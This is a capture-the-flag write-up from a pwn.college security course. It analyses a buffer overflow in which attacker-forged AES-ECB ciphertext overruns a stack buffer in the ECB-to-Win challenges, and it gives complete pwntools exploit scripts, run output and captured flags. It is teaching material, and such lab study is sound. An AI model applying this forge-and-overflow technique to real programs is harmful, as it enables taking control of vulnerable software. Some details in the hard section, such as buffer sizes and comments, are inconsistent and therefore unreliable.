---
custom_edit_url: null
sidebar_position: 6
slug: /pwn-college/intro-to-cybersecurity/integrated-security
---

## ECB-to-Win (Easy)

### Source code

```c title="/vulnerable-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <openssl/evp.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void win()
{
    static char flag[256];
    static int flag_file;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_file = open("/flag", 0);
    if (flag_file < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_file, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

EVP_CIPHER_CTX *ctx;

int challenge(int argc, char **argv, char **envp)
{
    unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

    printf("Decrypted message: %s!\n", plaintext.message);

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    DUMP_STACK(sp_, sz_);
    fprintf(stderr, "The program's memory status:\n");
    fprintf(stderr, "- the input buffer starts at %p\n", plaintext.message);
    fprintf(stderr, "- the saved return address (previously to main) is at %p\n", rp_);
    fprintf(stderr, "- the address of win() is %p.\n", win);

}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```

We can see that the challenge defines a struct called `plaintext`, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `42` bytes are allocated to `message`.

```c showLineNumbers
# ---- snip ----

    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

# ---- snip ----
```

It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` gives the length of the user provided input.
It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.

```c showLineNumbers
# ---- snip ----

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

# ---- snip ----
```

It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext.header` and `plaintext.length`. The challenge then checks if `plaintext.header == "VERIFIED"`, and `plaintext.length <= 16`, if not, it exits.

```c showLineNumbers
# ---- snip ----

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

# ---- snip ----

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

# ---- snip ----
```

Then, it goes on to decrypt the rest of the ciphertext (`ciphertext + 16`), and stores it into `plaintext.message`.
The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message` which is only 42 bytes long, thus overflowing it.

```c showLineNumbers
# ---- snip ----

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

# ---- snip ----
```

There is another file called `/challenge/dispatch`, which gives us the ciphertext given any plaintext.

<img alt="image" src="https://github.com/user-attachments/assets/be3498df-21ca-4e97-b151-51d54f6bc4ea" />

```c title="/challenge/dispatch" showLineNumbers
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import struct
import sys
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = open("/challenge/.key", "rb").read()
cipher = AES.new(key=key, mode=AES.MODE_ECB)

message = sys.stdin.buffer.read1()
assert len(message) <= 16, "Your message is too long!"

plaintext = b"VERIFIED" + struct.pack(b"<Q", len(message)) + message
ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))

sys.stdout.buffer.write(ciphertext)
```

So whatever input we provide, the dispatcher prepends the `"VERIFIED"` header along with the `length`.

### Exploit

Let's check if the challenge binary is PIE.

```
hacker@integrated-security~ecb-to-win-easy:~$ checksec /challenge/vulnerable-overflow
[*] '/challenge/vulnerable-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Since it is not, let;s just get it to print out useful values we can use in the exploit.

```py title="~/script.py" showLineNumbers
from pwn import *

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Craft payload
payload = header_block 

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (16 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 983
[*] Switching to interactive mode
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: !
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffddabbe1b0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe1b8 (rsp+0x0008) | 88 e3 bb da fd 7f 00 00 | 0x00007ffddabbe388 |
| 0x00007ffddabbe1c0 (rsp+0x0010) | 78 e3 bb da fd 7f 00 00 | 0x00007ffddabbe378 |
| 0x00007ffddabbe1c8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffddabbe1d0 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
| 0x00007ffddabbe1d8 (rsp+0x0028) | a0 26 7f 0f 00 00 00 00 | 0x000000000f7f26a0 |
| 0x00007ffddabbe1e0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007ffddabbe1e8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffddabbe1f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe1f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe200 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe208 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe210 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe218 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe220 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe228 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffddabbe230 (rsp+0x0080) | 90 1e 40 00 00 00 00 00 | 0x0000000000401e90 |
| 0x00007ffddabbe238 (rsp+0x0088) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
| 0x00007ffddabbe240 (rsp+0x0090) | 60 24 3c 02 00 00 00 00 | 0x00000000023c2460 |
| 0x00007ffddabbe248 (rsp+0x0098) | 70 e3 bb da 03 00 00 00 | 0x00000003dabbe370 |
| 0x00007ffddabbe250 (rsp+0x00a0) | 80 e2 bb da fd 7f 00 00 | 0x00007ffddabbe280 |
| 0x00007ffddabbe258 (rsp+0x00a8) | 7a 1e 40 00 00 00 00 00 | 0x0000000000401e7a |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffddabbe1f0
- the saved return address (previously to main) is at 0x7ffddabbe258
- the address of win() is 0x4018f7.
[*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 983)
[*] Got EOF while reading in interactive
$  
```

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize values
win_addr = 0x4018f7 
buffer_addr = 0x7ffddabbe1f0
addr_of_saved_ip = 0x7ffddabbe258

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2-7 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]  
padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr) // 16)

# Block 7 - Return address overwrite
win_addr_block = b"C" * 8 
win_addr_block += p64(win_addr)
return_addr_cipher = get_encrypted_block(win_addr_block)
return_address_block = return_addr_cipher[16:32]

# 4. Final AES block - PKCS7 padding (16 bytes)
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (144 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 2086
[*] Switching to interactive mode
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC\xf7\x18@!
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffeb8769070 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffeb8769078 (rsp+0x0008) | 48 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769248 |
| 0x00007ffeb8769080 (rsp+0x0010) | 38 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769238 |
| 0x00007ffeb8769088 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffeb8769090 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
| 0x00007ffeb8769098 (rsp+0x0028) | a0 26 67 7b 01 00 00 00 | 0x000000017b6726a0 |
| 0x00007ffeb87690a0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007ffeb87690a8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffeb87690b0 (rsp+0x0040) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 2086)
| 0x00007ffeb87690b8 (rsp+0x0048) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690c0 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690c8 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690d0 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690d8 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690e0 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690e8 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690f0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb87690f8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769100 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769108 (rsp+0x0098) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffeb8769110 (rsp+0x00a0) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
| 0x00007ffeb8769118 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffeb87690b0
- the saved return address (previously to main) is at 0x7ffeb8769118
- the address of win() is 0x4018f7.
You win! Here is your flag:
pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## ECB-to-Win (Hard)

```
hacker@integrated-security~ecb-to-win-hard:~$ ls /challenge/
dispatch  vulnerable-overflow
```

### Binary Analysis

```c title="/challenge/dispatch" showLineNumbers
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import Crypto
import struct
import sys
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = open("/challenge/.key", "rb").read()
cipher = AES.new(key=key, mode=AES.MODE_ECB)

message = sys.stdin.buffer.read1()
assert len(message) <= 16, "Your message is too long!"

plaintext = (
    b"VERIFIED"
    + struct.pack(b"<Q", len(message))
    + message
)

ciphertext = cipher.encrypt(
    pad(plaintext, cipher.block_size)
)

sys.stdout.buffer.write(ciphertext)
```

The `/challenge/dispatch` input we provide, the dispatcher prepends the `"VERIFIED"` header along with the `length`.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  challenge((unsigned int)argc, argv, envp);
  return 0;
}
```

Let's look at the `challenge()` function.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int challenge()
{
  __int64 EVP_aes_128_ecb; // rax
  __int64 EVP_aes_128_ecb_1; // rax
  int decrypted_len; // [rsp+2Ch] [rbp-84h] BYREF
  __int64 plaintext_header; // [rsp+30h] [rbp-80h] BYREF
  unsigned __int64 plaintext_len; // [rsp+38h] [rbp-78h]
  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF
  char key[24]; // [rsp+80h] [rbp-30h] BYREF
  unsigned __int64 ciphertext_len; // [rsp+98h] [rbp-18h]
  void *ciphertext; // [rsp+A0h] [rbp-10h]
  int key_file; // [rsp+ACh] [rbp-4h]

  plaintext_header = 0LL;
  plaintext_len = 0LL;
  memset(plaintext_message, 0, 56);
  key_file = open("/challenge/.key", 0);
  if ( !key_file )
    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
  if ( read(key_file, key, 16uLL) != 16 )
    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb, 0LL, key, 0LL);
  close(key_file);
  ciphertext = malloc(4096uLL);
  ciphertext_len = read(0, ciphertext, 4096uLL);
  if ( (ciphertext_len & 15) != 0 )
    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
  if ( ciphertext_len <= 15 )
    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");
  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
    __assert_fail(
      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
      "/challenge/vulnerable-overflow.c",
      0x56u,
      "challenge");
  if ( plaintext_len > 16 )
    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
  memset(key, 0, 16uLL);
  EVP_DecryptUpdate(
    ctx,
    plaintext_message,
    &decrypted_len,
    (char *)ciphertext + 16,
    (unsigned int)(ciphertext_len - 16));
  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
  return printf("Decrypted message: %s!\n", (const char *)plaintext_message);
}
```

We can see that the challenge defines a struct, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `56` bytes are allocated to `plaintext_message`.

The `plaintext_message` buffer is located at `rbp-0x70`, which means it is at an offset of `120` bytes from the stored return address.

```c showLineNumbers
# ---- snip ----

  __int64 plaintext_message[8]; // [rsp+40h] [rbp-70h] BYREF

# ---- snip ----

  plaintext_header = 0LL;
  plaintext_len = 0LL;
  memset(plaintext_message, 0, 56);

# ---- snip ----
```

It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` gives the length of the user provided input.
It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.

```c showLineNumbers
# ---- snip ----

  ciphertext = malloc(4096uLL);
  ciphertext_len = read(0, ciphertext, 4096uLL);
  if ( (ciphertext_len & 15) != 0 )
    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 78u, "challenge");
  if ( ciphertext_len <= 15 )
    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 79u, "challenge");

# ---- snip ----
```

It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext_header` and `plaintext_length`. The challenge then checks if `plaintext_header == "VERIFIED"`, and `plaintext_length <= 16`, if not, it exits.

```c showLineNumbers
# ---- snip ----

  key_file = open("/challenge/.key", 0);
  if ( !key_file )
    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 70u, "challenge");
  if ( read(key_file, key, 16uLL) != 16 )
    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
  ctx = EVP_CIPHER_CTX_new();

# ---- snip ----

  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
    __assert_fail(
      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
      "/challenge/vulnerable-overflow.c",
      0x56u,
      "challenge");
  if ( plaintext_len > 16 )
    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 87u, "challenge");

# ---- snip ----
```

Then, it goes on to decrypt the rest of the ciphertext (`(char *)ciphertext + 16`), and stores it into `plaintext_message`.
The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message` which is only 42 bytes long, thus overflowing it.

```c showLineNumbers
# ---- snip ----

  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
  memset(key, 0, 16uLL);
  EVP_DecryptUpdate(
    ctx,
    plaintext_message,
    &decrypted_len,
    (char *)ciphertext + 16,
    (unsigned int)(ciphertext_len - 16));
  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);

# ---- snip ----
```

Finally, let's look at the `win()` function.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int win()
{
  int *v0; // rax
  char *error_msg; // rax
  int *v2; // rax
  char *error_msg_1; // rax

  puts("You win! Here is your flag:");
  flag_file = open("/flag", 0);
  if ( flag_file < 0 )
  {
    v0 = __errno_location();
    error_msg = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", error_msg);
    if ( geteuid() )
    {
      puts("  Your effective user id is not 0!");
      puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
    exit(-1);
  }
  flag_length = read(flag_file, &flag_buf, 0x100uLL);
  if ( flag_length <= 0 )
  {
    v2 = __errno_location();
    error_msg_1 = strerror(*v2);
    printf("\n  ERROR: Failed to read the flag -- %s!\n", error_msg_1);
    exit(-1);
  }
  write(1, &flag_buf, flag_length);
  return puts("\n");
}
```

We also need the address of the `win()` function.

```
pwndbg> info address win
Symbol "win" is at 0x4013b6 in a file compiled without debugging.
```

### Exploit

Let's check if the challenge binary is PIE.



```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize values
win_addr = 0x4013b6  

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2-7 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]  
padding_blocks = padding_block * 7

# Block 7 - Return address overwrite
win_addr_block = b"C" * 8 
win_addr_block += p64(win_addr)
return_addr_cipher = get_encrypted_block(win_addr_block)
return_address_block = return_addr_cipher[16:32]

# 4. Final AES block - PKCS7 padding (16 bytes)
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (160 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 664
[*] Switching to interactive mode
[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 664)
Decrypted message: A\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fA\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0fBBBBBBBB\xb6\x13@!
You win! Here is your flag:
pwn.college{8oPskq3iYUANAHB2VuRKUKH8mWh.QX4UDMxEDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## ECB-to-Shellcode (Easy)

### Source code

```c title="/challenge/vulnerable-overflow.c" showLineNumbers
